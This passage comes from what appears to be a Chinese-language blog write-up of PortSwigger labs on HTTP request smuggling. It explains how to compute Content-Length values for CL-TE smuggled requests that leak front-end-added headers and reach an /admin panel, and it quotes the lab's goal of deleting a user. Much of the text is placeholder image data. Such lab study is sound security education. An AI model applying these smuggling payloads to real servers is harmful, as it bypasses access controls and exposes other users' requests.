src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191123155603.png" alt=""></p><p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：</p><p></p><figure class="highlight angelscript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\r\n--&gt; <span class="hljs-number">3</span>个字节</span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span>个字节</span><br><span class="line">GET /admin HTTP/<span class="hljs-number">1.1</span>\r\n--&gt; <span class="hljs-number">19</span>+<span class="hljs-number">2</span> = <span class="hljs-number">21</span> 个字节</span><br><span class="line">\r\n--&gt; <span class="hljs-number">2</span>个字节</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以这么结算下来就是 3+2+21+2 = 28字节。</p><p>TE-CL 的情况类似，这里就不再重复举例了。</p><h3 id="Revealing-Front-end-Request-Rewriting"><a href="#Revealing-Front-end-Request-Rewriting" class="headerlink" title="Revealing Front-end Request Rewriting"></a>Revealing Front-end Request Rewriting</h3><blockquote><p>​    在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>有时候 Front 服务器会给转发的请求添加一些请求头再转发给 Backend 服务器，我们可以利用 HTTP Smuggling 的方式来泄露这些请求头。同样我们借助 LAB 来实践理解：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>There’s an admin panel at /admin, but it’s only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It’s similar to the X-Forwarded-For header but has a different name.</p><p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.</p></blockquote><p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124191719.png" alt=""></p><p>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203138.png" alt=""></p><p>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124202357.png" alt=""></p><p>如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend 收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124204018.png" alt=""></p><p>所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front 服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124203108.png" alt=""></p><p>整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的：</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-number">0</span>\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span><span class="hljs-number">3</span>个字节</span><br><span class="line">\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span> <span class="hljs-number">2</span>个字节</span><br><span class="line">POST / HTTP/<span class="hljs-number">1.1</span>\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span><span class="hljs-number">17</span>个字节</span><br><span class="line">C<span class="hljs-function"><span class="hljs-title">ontent</span>-Length: 70\r\n--&gt;</span><span class="hljs-number">20</span>个字节</span><br><span class="line">C<span class="hljs-function"><span class="hljs-title">ontent</span>-Type: application/x-www-form-urlencoded\r\n--&gt;</span><span class="hljs-number">49</span>个字节</span><br><span class="line">\<span class="hljs-function"><span class="hljs-title">r</span>\n--&gt;</span> <span class="hljs-number">2</span>个字节</span><br><span class="line"><span class="hljs-function"><span class="hljs-title">search</span>=123--&gt;</span> <span class="hljs-number">10</span>个字节</span><br></pre></td></tr></tbody></table></figure><p></p><p>总共是 103 个字节，这里的 CL 也可以不是 70 ，这里只是控制泄露多少字节的内容。</p><p>还有一个比较需要注意的就是如果你不添加 Content-Type 